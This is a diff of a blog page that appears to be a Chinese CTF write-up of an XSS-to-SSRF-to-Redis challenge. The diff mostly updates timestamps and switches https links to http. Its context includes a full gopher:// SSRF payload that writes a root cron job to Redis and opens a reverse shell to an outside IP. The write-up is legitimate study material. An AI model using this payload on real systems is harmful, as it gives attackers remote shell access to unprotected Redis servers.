@@ -137,7 +137,7 @@
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/qhqjoll25yorcusshkojm8ps/image_1d3b2e3pc1hbu1dg2fcv9j5biq3h.png">
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/a3x5siapt9f32a80wxjjy39i/image_1d3basv6lemp4e91akeq2m11v03u.png">
 <meta property="og:image" content="http://static.zybuluo.com/Passer6y/fgcj5kjvcc91xyu97memme45/image_1d3bboftp1b9u1m0fpk91g2em174b.png">
-<meta property="og:updated_time" content="2019-02-10T09:35:12.000Z">
+<meta property="og:updated_time" content="2020-03-19T11:16:35.018Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="The power of XSS WriteUp">
 <meta name="twitter:description" content="学习了一下xss-&amp;gt;ssrf-&amp;gt;redis">
@@ -172,7 +172,7 @@
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
+      hm.src = "http://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(hm, s);
     })();
@@ -450,12 +450,24 @@
                 
               
 
-              <time title="Created: 2019-02-10 17:31:00 / Modified: 17:35:12" itemprop="dateCreated datePublished" datetime="2019-02-10T17:31:00+08:00">2019-02-10</time>
+              <time title="Created: 2019-02-10 17:31:00" itemprop="dateCreated datePublished" datetime="2019-02-10T17:31:00+08:00">2019-02-10</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-03-19 19:16:35" itemprop="dateModified" datetime="2020-03-19T19:16:35+08:00">2020-03-19</time>
               
             
           </span>
@@ -533,7 +545,7 @@
 <p>编码后，打到<br><img src="http://static.zybuluo.com/Passer6y/qhqjoll25yorcusshkojm8ps/image_1d3b2e3pc1hbu1dg2fcv9j5biq3h.png" alt="image_1d3b2e3pc1hbu1dg2fcv9j5biq3h.png-57.6kB"></p>
 <p>flag2:<code>FLAG{curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck}</code></p>
 <h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>提示我们打内网redis，redis协议使用的是简单的文本流。<br>比如下面发送的tcp流数据，每行代表一条命令，下面是两个<code>set</code>命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET x 1</span><br><span class="line">SET y 2</span><br></pre></td></tr></table></figure></p>
-<p>显然，如果是get型的ssrf他无法控制单独的一行(除非有crlf漏洞)，p神这篇文章提到了这个点：<a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a></p>
+<p>显然，如果是get型的ssrf他无法控制单独的一行(除非有crlf漏洞)，p神这篇文章提到了这个点：<a href="http://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html" target="_blank" rel="noopener">http://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a></p>
 <p>所以这里得用Gopher协议，可以以get形式发起post请求</p>
 <p>用popherus生成了个弹shell的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:25566/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/155.94.177.154/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure></p>
 <p>payload:</p>
@@ -766,7 +778,7 @@
             <div class="links-of-author motion-element">
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="http://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                   
                 </span>
               
@@ -791,7 +803,7 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
+                    <a href="http://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -799,19 +811,19 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
+                    <a href="http://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
+                    <a href="http://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
+                    <a href="http://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
+                    <a href="http://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -819,11 +831,11 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
+                    <a href="http://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
+                    <a href="http://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
                   </li>
                 
               </ul>
